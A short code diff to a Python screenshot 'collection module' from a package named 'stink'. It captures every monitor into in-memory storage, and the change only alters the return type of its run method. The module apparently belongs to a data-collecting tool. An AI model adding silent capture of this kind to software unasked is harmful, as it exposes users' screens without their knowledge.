@@ -1,7 +1,7 @@
 from os import path
-from typing import List
 
 from stink.helpers import Screencapture, MemoryStorage
+from stink.helpers.dataclasses import Data
 
 
 class Screenshot:
@@ -29,7 +29,7 @@ class Screenshot:
         for index, monitor in enumerate(screenshots):
             self.__storage.add_from_memory(path.join(self.__folder, f"monitor-{index}.png"), monitor)
 
-    def run(self) -> List:
+    def run(self) -> Data:
         """
         Launches the screenshots collection module.
 
